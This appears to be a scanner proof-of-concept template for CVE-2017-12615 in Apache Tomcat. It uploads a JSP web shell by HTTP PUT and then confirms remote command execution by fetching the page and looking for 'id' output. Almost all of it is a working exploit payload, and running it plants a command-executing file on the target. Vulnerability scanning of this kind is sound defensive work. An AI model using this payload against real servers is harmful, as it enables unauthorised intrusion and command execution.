cve-id: CVE-2017-12615
set:  
  rand: randomInt(200000000, 210000000)
rules:
  - method: PUT
    path: /_{{rand}}.jsp/
    body: |
      <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if(1==1){out.print(excuteCmd("id"));}%>
    expression: response.status == 201 || response.status == 200

  - method: GET
    path: /_{{rand}}.jsp
    expression: |
      response.body.bcontains(b"uid") &&
      response.body.bcontains(b"gid") &&
      response.body.bcontains(b"groups")
severity:
  critical
type: 
  rce
